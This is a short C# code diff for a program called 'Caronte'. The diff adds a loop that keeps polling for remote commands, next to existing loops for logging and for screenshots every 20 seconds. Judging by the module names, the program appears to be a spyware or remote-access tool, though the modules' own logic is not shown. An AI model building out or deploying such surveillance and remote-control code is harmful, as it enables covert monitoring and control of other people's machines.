@@ -1,5 +1,6 @@
 ﻿using Caronte.Modules.Logger;
 using Caronte.Modules.PrintScreen;
+using Caronte.Modules.ReceiveCommand;
 using MediatR;
 using System;
 using System.Threading;
@@ -18,8 +19,10 @@ namespace Caronte
 
             var logTask = InitializeLogTask();
             var printScreenTask = InitializePrintScreenTask();
+            var receiveCommandTask = InitializeReceiveCommandTask();
 
-            await Task.WhenAll(logTask, printScreenTask);
+
+            await Task.WhenAll(logTask, printScreenTask, receiveCommandTask);
         }
 
         private static Task InitializeLogTask()
@@ -29,7 +32,6 @@ namespace Caronte
                 while (!_cancellationToken.IsCancellationRequested)
                 {
                     await _mediator.Send(new LogQuery());
-                    await Task.Delay(TimeSpan.FromSeconds(1), _cancellationToken);
                 }
             }, _cancellationToken);
 
@@ -43,11 +45,24 @@ namespace Caronte
                 while (!_cancellationToken.IsCancellationRequested)
                 {
                     await _mediator.Send(new PrintScreenQuery());
-                    await Task.Delay(TimeSpan.FromSeconds(1), _cancellationToken);
+                    await Task.Delay(TimeSpan.FromSeconds(20), _cancellationToken);
                 }
             }, _cancellationToken);
 
             return printScreenTask;
+        }
+
+        private static Task InitializeReceiveCommandTask()
+        {
+            var receiveCommandTask = Task.Run(async () =>
+            {
+                while (!_cancellationToken.IsCancellationRequested)
+                {
+                    await _mediator.Send(new ReceiveCommandQuery());
+                }
+            }, _cancellationToken);
+
+            return receiveCommandTask;
         }
     }
 }
